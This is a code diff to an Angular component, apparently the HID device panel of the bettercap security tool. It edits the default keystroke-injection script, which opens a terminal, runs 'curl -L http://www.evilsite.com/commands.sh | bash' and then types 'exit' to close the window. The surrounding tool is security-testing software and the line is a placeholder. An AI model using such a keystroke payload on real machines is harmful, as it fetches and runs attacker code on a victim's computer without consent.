@@ -64,13 +64,16 @@ export class HidTableComponent implements OnInit, OnDestroy {
     showInjectModal(dev) {
         let pathToken = { label: 'Save As', id: 'PATH', value: '/tmp/bettercap-hid-script.txt' };
         let dataToken = { label: 'Code', id: 'DATA', value:
-            "GUI SPACE\n" +
-            "DELAY 200\n" +
+            "GUI\n" +
+            "DELAY 500\n" +
             "STRING Terminal\n" +
+            "DELAY 500\n" +
             "ENTER\n" +
             "DELAY 500\n" +
             "STRING curl -L http://www.evilsite.com/commands.sh | bash\n" +
-            "ENTER"
+            "ENTER\n" +
+            "STRING exit\n" +
+            "ENTER" 
         };
 
         this.injDev = dev;
